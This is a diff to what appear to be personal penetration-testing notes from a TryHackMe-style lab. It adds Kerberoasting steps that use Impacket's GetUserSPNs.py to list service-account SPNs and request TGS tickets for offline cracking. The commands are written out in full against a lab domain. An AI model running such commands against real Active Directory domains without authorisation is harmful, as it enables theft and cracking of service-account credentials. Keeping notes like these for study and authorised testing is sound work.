@@ -17,8 +17,15 @@ python3  ${IMPACKET_SCRIPTS}/${script} ...
 
 ## Kerberoasting
 
+check for SPN accounts:
 ```
-python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${USER}
+python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 
+
+```
+Now, we can request the TGS for the found user:
+
+```
+python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip 10.10.70.248 THM.red/${DOMAIN_USER}:${DOMAIN_USER_PW}! -request-user ${SPN} -outputfile tgs.txt 
 ```
 
 
